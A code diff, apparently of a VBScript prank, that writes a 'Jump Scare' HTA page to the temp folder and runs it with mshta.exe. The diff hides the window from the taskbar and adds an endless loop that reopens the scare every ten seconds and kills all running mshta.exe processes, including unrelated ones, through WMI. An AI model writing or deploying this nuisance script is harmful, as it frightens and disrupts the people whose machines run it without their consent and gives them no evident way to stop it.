@@ -5,7 +5,7 @@ htaFile = fso.GetSpecialFolder(2) & "\JumpScare.hta"
 htaContent = "<html>" & _
              "<head>" & _
              "<title>Jump Scare</title>" & _
-             "<HTA:APPLICATION ID='JumpScareApp' APPLICATIONNAME='Jump Scare' BORDER='thick' CAPTION='no' SHOWINTASKBAR='yes' SINGLEINSTANCE='yes' WINDOWSTATE='normal'>" & _
+             "<HTA:APPLICATION ID='JumpScareApp' APPLICATIONNAME='Jump Scare' BORDER='thick' CAPTION='no' SHOWINTASKBAR='no' SINGLEINSTANCE='yes' WINDOWSTATE='normal'>" & _
              "<style>" & _
              "body { margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: black; }" & _
              "img { max-width: 100%; max-height: 100%; }" & _
@@ -16,11 +16,31 @@ htaContent = "<html>" & _
              "</body>" & _
              "</html>"
 
-' Create and write to the HTA file
-Set ts = fso.CreateTextFile(htaFile, True)
-ts.Write htaContent
-ts.Close
+' Function to create and open the HTA file
+Sub OpenHTA()
+    ' Create and write to the HTA file
+    Set ts = fso.CreateTextFile(htaFile, True)
+    ts.Write htaContent
+    ts.Close
 
-' Open the HTA file
-Set objShell = CreateObject("WScript.Shell")
-objShell.Run "mshta.exe """ & htaFile & """", 1, False
+    ' Open the HTA file
+    Set objShell = CreateObject("WScript.Shell")
+    objShell.Run "mshta.exe """ & htaFile & """", 1, False
+End Sub
+
+' Main loop to handle the reopening of the HTA
+Do
+    OpenHTA
+    WScript.Sleep 10000 ' Wait for 10 seconds (10000 milliseconds)
+
+    ' Close the HTA application
+    On Error Resume Next
+    Set objWMI = GetObject("winmgmts:\\.\root\cimv2")
+    Set colProcesses = objWMI.ExecQuery("Select * from Win32_Process Where Name = 'mshta.exe'")
+    For Each objProcess in colProcesses
+        objProcess.Terminate() ' Terminate the HTA process
+    Next
+    On Error GoTo 0
+
+    WScript.Sleep 1000 ' Wait for 1 second before reopening (to ensure it closes properly)
+Loop
